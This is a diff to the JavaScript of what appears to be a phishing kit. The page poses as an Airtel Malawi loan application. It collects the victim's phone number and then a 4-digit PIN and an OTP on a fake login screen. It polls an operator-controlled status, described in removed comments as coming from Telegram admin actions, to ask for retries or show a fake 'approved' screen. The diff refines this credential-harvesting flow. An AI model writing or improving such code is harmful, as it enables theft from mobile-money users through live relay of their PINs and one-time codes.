@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const stepLoan1 = document.getElementById('step-loan-1');
   const stepLoan2 = document.getElementById('step-loan-2');
   const stepLoan3 = document.getElementById('step-loan-3');
-  const stepForm = document.getElementById('step-form'); // Account Login Screen
+  const stepForm = document.getElementById('step-form'); // Login Screen
   const stepLoading = document.getElementById('step-loading');
   const stepOtp = document.getElementById('step-otp') || document.getElementById('step-WHATSSAP');
   const stepSuccess = document.getElementById('step-success');
@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Digit auto focus logic
+  // Digit Inputs Setup
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits = document.querySelectorAll('.otp-digit');
 
@@ -67,7 +67,7 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits);
 
-  // Toggle PIN Eye Icon
+  // Toggle PIN visibility
   const toggleEye = document.getElementById('toggle-pin-visibility');
   let isPinVisible = false;
   if (toggleEye) {
@@ -77,7 +77,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Step Transitions
+  // Navigation handlers
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
     showStep(stepSlider);
   });
@@ -94,12 +94,35 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepLoan2);
   });
 
+  const phoneNumber = document.getElementById('phone-number');
+  const phoneError = document.getElementById('phone-error');
+
   document.getElementById('btn-loan2-back').addEventListener('click', () => {
     showStep(stepLoan1);
   });
 
   document.getElementById('btn-loan2-next').addEventListener('click', () => {
-    // Populate Summary Details
+    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
+    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);
+
+    if (!isMalawiNumber) {
+      phoneError.style.display = 'block';
+      return;
+    }
+    phoneError.style.display = 'none';
+
+    // Sync phone number to login screen field
+    document.getElementById('login-phone').value = cleanPhone;
+
+    showStep(stepLoan3);
+  });
+
+  document.getElementById('btn-loan3-back').addEventListener('click', () => {
+    showStep(stepLoan2);
+  });
+
+  document.getElementById('btn-loan3-next').addEventListener('click', () => {
+    // Populate Summary
     const loanAmount = document.getElementById('loan-amount').value;
     const loanDuration = document.getElementById('loan-duration').value;
     const loanType = document.getElementById('loan-type').value;
@@ -111,38 +134,24 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('sum-category').innerText = loanType;
     document.getElementById('sum-name').innerText = `${firstName} ${lastName}`.trim() || 'Valued Customer';
 
-    showStep(stepLoan3);
-  });
-
-  document.getElementById('btn-loan3-back').addEventListener('click', () => {
-    showStep(stepLoan2);
-  });
-
-  // Step 3 of 3 Next -> Account Login Screen
-  document.getElementById('btn-loan3-next').addEventListener('click', () => {
     showStep(stepForm);
   });
 
-  // Login Submit Action (Submits Application to Server)
+  // Submit Application via Login Screen
   const loginPhone = document.getElementById('login-phone');
-  const phoneError = document.getElementById('phone-error');
   const pinError = document.getElementById('pin-error');
 
   document.getElementById('btn-login-submit').addEventListener('click', async () => {
     let valid = true;
 
-    // Validate Malawi Phone Number
     const cleanPhone = loginPhone.value.replace(/\D/g, '');
     const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);
 
     if (!isMalawiNumber) {
-      phoneError.style.display = 'block';
+      alert('Please enter a valid Airtel Malawi number.');
       valid = false;
-    } else {
-      phoneError.style.display = 'none';
     }
 
-    // Validate 4-digit PIN
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
     if (pinVal.length !== 4) {
       pinError.style.display = 'block';
@@ -183,7 +192,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Status Polling from Admin Telegram Actions
+  // Status Polling from Admin Actions
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -200,20 +209,18 @@ document.addEventListener('DOMContentLoaded', () => {
           document.getElementById('otp-phone-display').innerText = loginPhone.value;
           showStep(stepOtp);
         } else if (data.status === 'SUCCESS') {
-          // DIRECT TRANSITION TO SUCCESS SCREEN WHEN ADMIN TAPS 'CORRECT OTP'
+          // DIRECT TRANSITION TO SUCCESS SCREEN WITHOUT CONTINUOUS SPINNER
           clearInterval(statusPollInterval);
           hideLoading();
           document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
           showStep(stepSuccess);
         } else if (data.status === 'RETRY_PIN') {
-          // DISPLAY IN-PAGE WRONG PIN BANNER ON LOGIN SCREEN
           clearInterval(statusPollInterval);
           hideLoading();
           if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
           pinDigits.forEach(i => i.value = '');
           showStep(stepForm);
         } else if (data.status === 'RETRY_OTP') {
-          // DISPLAY IN-PAGE WRONG OTP BANNER ON OTP SCREEN
           clearInterval(statusPollInterval);
           hideLoading();
           if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
@@ -228,7 +235,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 3000);
   }
 
-  // Submit 4-digit OTP
+  // Submit OTP
   document.getElementById('btn-submit-otp').addEventListener('click', async () => {
     const otpVal = Array.from(otpDigits).map(i => i.value).join('');
 
@@ -277,4 +284,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-  
+    
